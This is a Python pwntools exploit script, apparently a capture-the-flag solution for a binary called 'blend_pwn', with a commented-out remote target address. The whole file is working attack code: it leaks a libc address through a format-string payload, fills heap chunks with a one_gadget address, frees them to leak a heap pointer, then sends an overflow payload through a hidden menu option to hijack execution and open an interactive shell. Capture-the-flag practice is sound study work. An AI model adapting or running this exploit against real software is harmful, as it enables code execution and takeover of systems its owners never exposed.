#coding=utf-8
from pwn import *
#context.log_level='debug'
sh=process("./blend_pwn")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#sh=remote('47.111.104.169',57704)
og = [0x45226 ,0x4527a,0xf0364,0xf1207]
def name(name):
    sh.recvuntil("name:")
    sh.send(name)

def showname():
    sh.recvuntil('choice >')
    sh.sendline(str(1))

def add(content):
	sh.recvuntil('choice >')
	sh.sendline(str(2))
	sh.sendline(content)

def show():
	sh.recvuntil("choice >")
	sh.sendline(str(4))

def delete(idx):
	sh.recvuntil("choice >")
	sh.sendline(str(3))
	sh.recvuntil("index>")
	sh.sendline(str(idx))

def gift(con):
    sh.recvuntil("choice >")
    sh.sendline(str(666))
    sh.recvuntil("Please input what you want:")
    #gdb.attach(sh,"b *$rebase(0x11E9)")
    sh.send(con)

name("%11$p")
showname()
sh.recvuntil("Current user:")
libc_base = int(sh.recvline(),16) - libc.sym['__libc_start_main'] -240
read1 = libc_base + libc.sym['read']
info(hex(libc_base))
onegadget = libc_base + og[1]
info(hex(onegadget))
# sys = libc_base + libc.sym['system']
add(p64(onegadget)*0xc)
add(p64(onegadget)*0xc)
delete(0)
delete(1)
gdb.attach(sh)
show()
sh.recvuntil('index 2:')
heap_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00')) + 0x28
info(hex(heap_addr))
payload = 'a'*0x20 + p64(heap_addr)
gift(payload)

sh.interactive()
